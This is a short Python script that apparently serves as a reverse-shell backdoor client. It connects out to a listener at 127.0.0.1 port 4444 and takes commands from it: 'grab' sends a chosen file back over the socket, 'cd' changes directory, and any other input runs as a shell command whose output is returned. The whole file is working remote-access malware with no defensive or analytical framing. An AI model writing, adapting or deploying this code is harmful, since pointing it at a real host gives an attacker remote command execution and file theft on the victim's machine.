import socket,subprocess,os

def transfer(s,path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(1024)
        while packet:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
        f.close()
    else:
        s.send('Unable to find out the file'.encode())


def connect():
    s = socket.socket()
    s.connect(('127.0.0.1', 4444))
    while 1:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab, path = command.decode().split('*')
            try:
                transfer(s,path)
            except Exception as e:
                s.send(str(e).encode())
                pass
        elif 'cd' in command.decode():
            # split the received commnad:
            code, directory = command.decode().split('*')
            try:
                os.chdir(directory)
                s.send(('[+] CWD is' + os.getcwd()).encode())
            except Exception as e:
             # this means that if there is any error store it in e variable:
                s.send(('[-] CWD is' + str(e)).encode())
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read() + CMD.stderr.read())

def main():
    connect()
main()             